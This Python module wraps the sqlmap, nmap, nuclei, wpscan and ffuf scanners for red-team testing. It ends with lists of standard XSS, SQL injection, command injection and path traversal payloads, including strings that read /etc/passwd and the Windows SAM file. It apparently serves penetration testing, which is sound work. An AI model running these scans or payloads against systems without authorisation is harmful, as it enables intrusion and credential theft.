"""
Red-Teaming Tool Integrations

This module provides utilities and integrations for popular red-teaming tools.
It includes helper functions to interact with command-line tools and parse their output.
"""

import subprocess
import json
import re
from typing import List, Dict, Any, Optional
from pathlib import Path


class ToolIntegration:
    """Base class for tool integrations."""
    
    def __init__(self, tool_path: Optional[str] = None):
        """
        Initialize tool integration.
        
        Args:
            tool_path: Path to the tool executable (if not in PATH)
        """
        self.tool_path = tool_path
        self.tool_name = self.__class__.__name__
    
    def is_available(self) -> bool:
        """Check if tool is available."""
        try:
            result = subprocess.run(
                [self.tool_path or self.tool_name, "--version"],
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False
    
    def run_command(self, args: List[str], timeout: int = 300) -> Dict[str, Any]:
        """
        Run tool command.
        
        Args:
            args: Command arguments
            timeout: Command timeout in seconds
        
        Returns:
            Dictionary with stdout, stderr, and returncode
        """
        cmd = [self.tool_path or self.tool_name] + args
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "success": result.returncode == 0
            }
        except subprocess.TimeoutExpired:
            return {
                "stdout": "",
                "stderr": "Command timed out",
                "returncode": -1,
                "success": False
            }
        except Exception as e:
            return {
                "stdout": "",
                "stderr": str(e),
                "returncode": -1,
                "success": False
            }


class SQLMapIntegration(ToolIntegration):
    """Integration for SQLMap tool."""
    
    def __init__(self, tool_path: Optional[str] = None):
        super().__init__(tool_path or "sqlmap")
    
    def test_url(self, url: str, parameter: str, level: int = 1, risk: int = 1) -> Dict[str, Any]:
        """
        Test URL for SQL injection using SQLMap.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            level: Test level (1-5)
            risk: Risk level (1-3)
        
        Returns:
            Test results
        """
        args = [
            "-u", url,
            "-p", parameter,
            "--level", str(level),
            "--risk", str(risk),
            "--batch",
            "--answers=quit=N",
            "--no-cast",
            "--disable-coloring"
        ]
        
        result = self.run_command(args)
        
        # Parse SQLMap output
        vulnerabilities = []
        if "is vulnerable" in result["stdout"].lower():
            vulnerabilities.append({
                "parameter": parameter,
                "url": url,
                "vulnerable": True
            })
        
        return {
            "tool": "sqlmap",
            "url": url,
            "parameter": parameter,
            "vulnerabilities": vulnerabilities,
            "output": result["stdout"],
            "success": result["success"]
        }


class NmapIntegration(ToolIntegration):
    """Integration for Nmap tool."""
    
    def __init__(self, tool_path: Optional[str] = None):
        super().__init__(tool_path or "nmap")
    
    def scan_host(self, target: str, ports: Optional[str] = None, 
                  scan_type: str = "-sS") -> Dict[str, Any]:
        """
        Scan host using Nmap.
        
        Args:
            target: Target host or IP
            ports: Port range (e.g., "80,443,8000-9000")
            scan_type: Scan type (-sS, -sT, -sU, etc.)
        
        Returns:
            Scan results
        """
        args = [scan_type, "-oN", "-"]
        
        if ports:
            args.extend(["-p", ports])
        
        args.append(target)
        
        result = self.run_command(args)
        
        # Parse Nmap output
        open_ports = []
        if result["success"]:
            port_pattern = r"(\d+)/(tcp|udp)\s+open\s+(\w+)"
            matches = re.findall(port_pattern, result["stdout"])
            for match in matches:
                open_ports.append({
                    "port": int(match[0]),
                    "protocol": match[1],
                    "service": match[2]
                })
        
        return {
            "tool": "nmap",
            "target": target,
            "open_ports": open_ports,
            "output": result["stdout"],
            "success": result["success"]
        }


class NucleiIntegration(ToolIntegration):
    """Integration for Nuclei vulnerability scanner."""
    
    def __init__(self, tool_path: Optional[str] = None):
        super().__init__(tool_path or "nuclei")
    
    def scan_url(self, url: str, templates: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Scan URL using Nuclei.
        
        Args:
            url: Target URL
            templates: List of template tags to use
        
        Returns:
            Scan results
        """
        args = ["-u", url, "-json", "-silent"]
        
        if templates:
            args.extend(["-tags", ",".join(templates)])
        
        result = self.run_command(args)
        
        # Parse JSON output
        findings = []
        if result["success"]:
            for line in result["stdout"].strip().split("\n"):
                if line:
                    try:
                        finding = json.loads(line)
                        findings.append(finding)
                    except json.JSONDecodeError:
                        continue
        
        return {
            "tool": "nuclei",
            "url": url,
            "findings": findings,
            "count": len(findings),
            "success": result["success"]
        }


class WPScanIntegration(ToolIntegration):
    """Integration for WPScan WordPress scanner."""
    
    def __init__(self, tool_path: Optional[str] = None):
        super().__init__(tool_path or "wpscan")
    
    def scan_wordpress(self, url: str, api_token: Optional[str] = None) -> Dict[str, Any]:
        """
        Scan WordPress site using WPScan.
        
        Args:
            url: WordPress site URL
            api_token: WPScan API token (optional)
        
        Returns:
            Scan results
        """
        args = ["--url", url, "--format", "json", "--no-banner"]
        
        if api_token:
            args.extend(["--api-token", api_token])
        
        result = self.run_command(args)
        
        # Parse JSON output
        findings = {}
        if result["success"]:
            try:
                findings = json.loads(result["stdout"])
            except json.JSONDecodeError:
                pass
        
        return {
            "tool": "wpscan",
            "url": url,
            "findings": findings,
            "success": result["success"]
        }


class FFufIntegration(ToolIntegration):
    """Integration for FFuf web fuzzer."""
    
    def __init__(self, tool_path: Optional[str] = None):
        super().__init__(tool_path or "ffuf")
    
    def fuzz_url(self, url: str, wordlist: str, 
                 status_codes: Optional[List[int]] = None) -> Dict[str, Any]:
        """
        Fuzz URL using FFuf.
        
        Args:
            url: Target URL with FUZZ placeholder
            wordlist: Path to wordlist file
            status_codes: List of status codes to match
        
        Returns:
            Fuzzing results
        """
        args = [
            "-u", url,
            "-w", wordlist,
            "-o", "-",
            "-of", "json"
        ]
        
        if status_codes:
            args.extend(["-mc", ",".join(map(str, status_codes))])
        
        result = self.run_command(args)
        
        # Parse JSON output
        results = []
        if result["success"]:
            try:
                data = json.loads(result["stdout"])
                results = data.get("results", [])
            except json.JSONDecodeError:
                pass
        
        return {
            "tool": "ffuf",
            "url": url,
            "results": results,
            "count": len(results),
            "success": result["success"]
        }


class ToolManager:
    """Manager for multiple tool integrations."""
    
    def __init__(self):
        """Initialize tool manager."""
        self.tools = {
            "sqlmap": SQLMapIntegration(),
            "nmap": NmapIntegration(),
            "nuclei": NucleiIntegration(),
            "wpscan": WPScanIntegration(),
            "ffuf": FFufIntegration(),
        }
    
    def get_available_tools(self) -> List[str]:
        """Get list of available tools."""
        available = []
        for name, tool in self.tools.items():
            if tool.is_available():
                available.append(name)
        return available
    
    def get_tool(self, tool_name: str) -> Optional[ToolIntegration]:
        """Get tool integration by name."""
        return self.tools.get(tool_name.lower())
    
    def list_tools(self) -> Dict[str, bool]:
        """List all tools and their availability."""
        return {
            name: tool.is_available()
            for name, tool in self.tools.items()
        }


# Utility functions for payload generation

def generate_xss_payloads() -> List[str]:
    """Generate common XSS payloads."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
    ]


def generate_sql_injection_payloads() -> List[str]:
    """Generate common SQL injection payloads."""
    return [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' UNION SELECT NULL--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR SLEEP(5)--",
        "admin'--",
        "admin'/*",
        "' OR 'a'='a",
        "\" OR \"1\"=\"1",
    ]


def generate_command_injection_payloads() -> List[str]:
    """Generate common command injection payloads."""
    return [
        "; ls",
        "| ls",
        "&& ls",
        "|| ls",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "$(whoami)",
        "`whoami`",
        "; ping -c 3 127.0.0.1",
        "| ping -c 3 127.0.0.1",
    ]


def generate_path_traversal_payloads() -> List[str]:
    """Generate common path traversal payloads."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..../..../..../etc/passwd",
    ]


# Example usage
if __name__ == "__main__":
    manager = ToolManager()
    
    print("Available Tools:")
    print("=" * 60)
    for name, available in manager.list_tools().items():
        status = "✓ Available" if available else "✗ Not Available"
        print(f"{name:15} {status}")
    
    print("\n" + "=" * 60)
    print("Available Tools List:")
    print(manager.get_available_tools())
    
    print("\n" + "=" * 60)
    print("XSS Payloads:")
    for payload in generate_xss_payloads()[:5]:
        print(f"  - {payload}")
    
    print("\n" + "=" * 60)
    print("SQL Injection Payloads:")
    for payload in generate_sql_injection_payloads()[:5]:
        print(f"  - {payload}")

